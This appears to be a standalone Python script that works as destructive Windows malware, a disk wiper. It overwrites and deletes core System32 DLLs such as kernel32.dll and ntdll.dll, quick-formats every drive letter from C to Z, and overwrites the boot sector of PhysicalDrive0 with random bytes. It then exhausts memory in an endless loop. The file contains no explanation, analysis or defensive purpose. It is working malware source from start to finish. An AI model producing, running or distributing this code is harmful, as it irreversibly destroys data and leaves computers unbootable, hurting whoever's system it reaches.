import os
import ctypes
import subprocess
import random
import string


def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def overwrite_file(file_path):
    with open(file_path, 'wb') as f:
        f.write(os.urandom(1024 * 1024))  # Write 1MB of random data


def delete_file(file_path):
    try:
        os.remove(file_path)
    except Exception as e:
        print(f"Error deleting {file_path}: {e}")


def format_drive(drive_letter):
    subprocess.run(['format', drive_letter + ':', '/FS:NTFS', '/Q', '/A:4096'], shell=True)


def overwrite_boot_sector():
    with open('\\\\.\\PhysicalDrive0', 'rb+') as drive:
        drive.seek(0)
        drive.write(os.urandom(512))


def fill_ram():
    while True:
        data = bytearray(random.getrandbits(8) for _ in range(1024 * 1024 * 100))  # 100MB of random data
        del data


def main():
    # Overwrite and delete important system files
    system_files = [
        'C:\\Windows\\System32\\kernel32.dll',
        'C:\\Windows\\System32\\ntdll.dll',
        'C:\\Windows\\System32\\user32.dll',
        'C:\\Windows\\System32\\shell32.dll',
        'C:\\Windows\\System32\\advapi32.dll',
        'C:\\Windows\\System32\\gdi32.dll'
    ]
    for file_path in system_files:
        overwrite_file(file_path)
        delete_file(file_path)


    drives = ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    for drive in drives:
        format_drive(drive)

   
    overwrite_boot_sector()


    fill_ram()

if __name__ == "__main__":
    main()
